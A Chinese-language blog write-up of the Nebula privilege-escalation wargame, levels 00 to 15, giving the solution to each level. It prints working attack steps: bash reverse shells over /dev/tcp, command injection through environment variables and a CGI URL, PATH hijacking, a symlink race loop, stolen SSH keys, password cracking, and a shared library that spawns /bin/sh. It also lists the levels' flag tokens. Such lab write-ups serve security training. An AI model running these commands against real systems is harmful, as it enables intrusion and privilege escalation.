---
layout: post
title: Nebula WriteUp
---

##level00:

```
find / -uid 999 2>>/dev/null
flag00@nebula:~$ getflag 
You have successfully executed getflag on a target account
```

##level01:

新建一个叫echo的文件，在文件内写上/bin/sh
`pwd`
将当前的路径加到环境变量PATH中去，

这样`system("/usr/bin/env echo ....") `时，会执行我们指定的命令


##level02:

优雅的将环境变量USER，变成这样：

```
export USER=`python -c "print '&& '+'/bin/sh' + ' ||'"`
```

##level03:
crontab是以flag03用户运行的，所以把命令写到文件里去，等着crontab来执行它，即可
给一个反连的shell
```
bash -c 'bash -i >& /dev/tcp/127.0.0.1/5555 0>&1'
```

##level04:

```
level04@nebula:~$ ln -s  ../flag04/token  abc
level04@nebula:~$ ls
abc

```

06508b5e-8909-4f38-b630-fdb148a848a2

##level05

.backup文件夹内竟然有.ssh的备份，果断download下来

`ssh flag05@192.168.1.115 -i id_rsa `

##level06

传统存储方式，在/etc/passwd里找到加密过的密钥，传统DES加密的，找了半天，原来还是
john the ripper好使
密钥为hello

##level07

```
http://192.168.1.115:7007/index.cgi?Host=||/bin/getflag
```

##level08

wireshark看一下数据包，passwd是这样的：

`backdoor...00Rm8.ate`

.号可能是退格，因此是这样的backd00Rmate

##level09

不会php，没太搞明白

##level10

原来是race condition
`time of check to time of use (TOCTTOU or TOCTOU, pronounced "TOCK too")`

access判断以后，open的时候，这之间有一段时间差

```
#在监听主机上进行监听
while true; do nc -l -p 18211 >> result; done

#循环切换软链接
while true; do ln -fs mytoken token; ln -fs ../flag10/token ; done

#反复跑setuid程序
while true; do ../flag10/flag10 token 192.168.1.116;done

#结果
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
以这个为密码，以flag10为用，登录，然后getflag
```

##level11

我的脚本没搞定，难道是题目真有问题，代码里没有setuid啊。system跑的东西，还是以level11跑的

其实都不用像下面这么麻烦，不用解密出来一样可以，解密第一个字母即可，这样两个分支用这种方法都可行

```python
#!/usr/bin/env python2

head = "Content-Length: "
for key in range(256, 257):
    target="whoami; getflag\x00"
    #target="whoami; gcc -o /tmp/shell /tmp/shell.c; chmod +s /tmp/shell\x00"
    a = ""
    leng = len(target)
    for i in range(leng,0,-1):
        j = i - 1
        key = key + ord(target[j])
        tmp = ord(target[j]) ^ (key & 0xff)
        a = chr(tmp) + a
    print head + str(key) + "\n" + a + "\x00"*(key-len(a))
```

##level12

太多commandline injection了,来一发反弹shell

`
nc -l -p 5555

1 && bash -c 'bash -i >& /dev/tcp/127.0.0.1/5555 0>&1' || echo 1
`

##level13

这么弱的加密，不忍卒视

```python
#!/usr/bin/env python2
input="8mjomjh8wml;bwnh8jwbbnnwi;>;88?o;9ob"

a = ""
for i in range(len(input)):
    a = a + chr(ord(input[i])^ord("Z"))

print a
```

得到b705702b-76a8-42b0-8844-3adabbe5ac58,作为passwd，Done.

##level14

关键加密函数一样很简单：

```c
for ( i = 0; i < (signed int)v9; ++i )
      buff[i] += v7++;
```

解密

```python

#!/usr/bin/env python2

enc = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."
leng = len(enc)
a = ""
for i in range(leng):
    a = a + chr(ord(enc[i]) - i)
print a
```

得到：8457c118-887c-4e40-a5a6-33a25353165

##level15
```c
#include <unistd.h>
#include <stdlib.h>

int __libc_start_main
(void) {
    system("/bin/sh");
    return 0;
}
```
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic hack.c -o mh.so

把libc静态编译到动态共享库中
